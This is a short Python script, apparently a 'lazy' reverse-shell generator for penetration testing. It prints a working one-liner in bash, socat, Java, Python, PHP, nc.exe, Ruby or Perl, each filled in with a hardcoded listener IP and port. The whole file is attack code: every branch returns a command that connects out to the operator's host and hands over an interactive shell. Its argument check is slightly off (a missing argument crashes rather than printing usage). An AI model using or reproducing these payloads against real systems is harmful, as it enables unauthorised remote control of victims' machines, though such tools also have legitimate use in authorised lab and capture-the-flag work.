# ENTER YOUR IP ADDRESS AND PORT IN THE CODE
# TO RUN python3 lazy bash

import sys

# Check if enough arguments are provided
if len(sys.argv) < 1:
    print("Error: too few arguments.")
    print("Usage: python script.py <shelltype> ")
    sys.exit(1)
elif len(sys.argv) > 2:
    print("Error: too many arguments.")
    print("Usage: python script.py <shelltype>")
    sys.exit(1)

# main
param_1 = sys.argv[1]

hostip="192.168.23.45" # change this
hostport="1234" #change this


# Switch case to choose what type of script is needed

def check_type(arg):
    match arg:
        case "bash":
            return f"/bin/bash -i >& /dev/tcp/{hostip}/{hostport} 0>&1"
        case "socat":
            return f"socat tcp:{hostip}:{hostport} exec:'bash -i' ,pty,stderr,setsid,sigint,sane &"
        case "java":
            return f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{hostip}/{hostport};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\np.waitFor()"
        case "python":
            return f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{hostip}\",{hostport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        case "php":
            return f"php -r '$sock=fsockopen(\"{hostip}\",{hostport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        case "nc.exe":
            return f"nc.exe {hostip} {hostport} -e /bin/bash"
        case "ruby":
            return f"ruby -rsocket -e'f=TCPSocket.open(\"{hostip}\",{hostport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        case "perl":
            return f"perl -e 'use Socket;$i=\"{hostip}\";$p={hostport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"

result = check_type(sys.argv[1])
print(result)
